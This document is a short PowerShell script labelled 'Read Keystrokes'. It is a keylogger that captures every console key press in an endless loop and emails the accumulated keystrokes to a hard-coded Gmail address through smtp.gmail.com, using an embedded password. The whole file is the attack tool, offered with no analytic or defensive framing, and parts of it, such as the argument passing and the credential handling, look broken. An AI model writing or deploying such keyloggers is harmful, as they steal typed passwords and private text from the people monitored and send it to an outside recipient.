# Read Keystrokes #

function SendMessage($sender,$recipient,$subject,$password,$message)
{
    $SMTPServer = "smtp.gmail.com"

    $SMTPPort = "587"

    Send-MailMessage -SMTPServer $SMTPServer -Port $SMTPPort -UseSSL -Credential $password -To $recipient -From $Sender -Subject $subject
}


$sender    = "018213110x@gmail.com"
$recipient = "018213110x@gmail.com"
$subject   = "Report"
$password  = "P@ssw0rd!P@ssw0rd!"

$buffer = ""

while($True)
{
    $key = [System.Console]::ReadKey()

    if($key.Key -eq "Spacebar")
    {
        $key = " "
        $buffer += $key
    }
    else 
    {
        $buffer+= $key.Key    
    }

   #Start-Sleep -Seconds 10

   SendMessage($sender,$recipient,$subject,$password,$buffer)
}